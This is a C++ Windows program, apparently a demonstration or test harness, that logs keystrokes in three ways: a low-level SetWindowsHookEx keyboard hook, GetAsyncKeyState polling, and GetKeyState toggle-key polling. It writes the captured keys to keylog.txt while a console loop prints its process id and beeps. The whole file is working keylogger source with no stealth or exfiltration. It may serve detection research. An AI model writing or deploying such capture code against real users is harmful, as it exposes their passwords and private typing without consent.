#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <mutex>

HHOOK keyboardHook;
std::ofstream keylog("keylog.txt", std::ios::app);
std::mutex logMutex;

// Helper to write to log with thread safety
void Log(const std::string& header, const std::string& content)
{
    std::lock_guard<std::mutex> lock(logMutex);
    if (keylog.is_open())
    {
        keylog << header << "\n" << content << "\n";
        keylog.flush();
    }
}

// -------------------------
// SetWindowsHookEx Method
// -------------------------

std::string VirtualKeyToString(KBDLLHOOKSTRUCT* kbdStruct)
{
    DWORD vkCode = kbdStruct->vkCode;
    BYTE keyboardState[256];
    char charBuffer[2];

    if (!GetKeyboardState(keyboardState))
        return "";

    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
    int result = ToAscii(vkCode, scanCode, keyboardState, (LPWORD)charBuffer, 0);
    if (result == 1)
        return std::string(1, charBuffer[0]);

    switch (vkCode)
    {
    case VK_RETURN: return "[ENTER]";
    case VK_BACK: return "[BACKSPACE]";
    case VK_TAB: return "[TAB]";
    case VK_SPACE: return " ";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    default:
        return "[UNK:" + std::to_string(vkCode) + "]";
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        std::string key = VirtualKeyToString(kbdStruct);
        Log("======= [HOOK - SetWindowsHookEx] =======", key);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void HookThread()
{
    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook)
    {
        std::cerr << "Failed to install keyboard hook.\n";
        return;
    }
    std::cout << "[*] Keyboard hook installed via SetWindowsHookEx\n";

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
}

// -------------------------
// GetAsyncKeyState Method
// -------------------------
void PollAsyncKeyState()
{
    BYTE keyboardState[256] = { 0 };
    char charBuffer[2] = { 0 };

    while (true)
    {
        GetKeyboardState(keyboardState);

        for (int vk = 8; vk <= 190; ++vk)
        {
            SHORT keyState = GetAsyncKeyState(vk);
            if (keyState & 0x8000) // key is down
            {
                UINT scanCode = MapVirtualKeyA(vk, MAPVK_VK_TO_VSC);
                int result = ToAscii(vk, scanCode, keyboardState, (LPWORD)charBuffer, 0);
                std::string keyStr;

                if (result == 1)
                {
                    keyStr = std::string(1, charBuffer[0]);
                }
                else
                {
                    switch (vk)
                    {
                    case VK_RETURN: keyStr = "[ENTER]"; break;
                    case VK_BACK: keyStr = "[BACKSPACE]"; break;
                    case VK_TAB: keyStr = "[TAB]"; break;
                    case VK_SHIFT: keyStr = "[SHIFT]"; break;
                    case VK_CONTROL: keyStr = "[CTRL]"; break;
                    case VK_MENU: keyStr = "[ALT]"; break;
                    case VK_SPACE: keyStr = " "; break;
                    default: keyStr = "[UNK:" + std::to_string(vk) + "]"; break;
                    }
                }

                Log("======= [POLL - GetAsyncKeyState] =======", keyStr);
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// -------------------------
// GetKeyState Method (Toggle Keys)
// -------------------------
void PollKeyToggleState()
{
    const int keysToCheck[] = { VK_CAPITAL, VK_NUMLOCK, VK_SCROLL };
    const char* keyNames[] = { "CapsLock", "NumLock", "ScrollLock" };

    while (true)
    {
        std::string toggles;
        for (int i = 0; i < 3; ++i)
        {
            SHORT state = GetKeyState(keysToCheck[i]);
            bool toggled = (state & 0x0001);
            toggles += std::string(keyNames[i]) + (toggled ? ":ON " : ":OFF ");
        }
        Log("======= [TOGGLE - GetKeyState] =======", toggles);
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}

// -------------------------
// Main Application Loop
// -------------------------
int main()
{
    std::thread hook(HookThread);
    std::thread async(PollAsyncKeyState);
    std::thread toggle(PollKeyToggleState);

    hook.detach();
    async.detach();
    toggle.detach();

    std::string value;
    while (true)
    {
        HANDLE currentThread = GetCurrentThread();
        std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
        CloseHandle(currentThread);

        std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
        std::getline(std::cin, value);
        Beep(500, 500);
    }

    return 0;
}
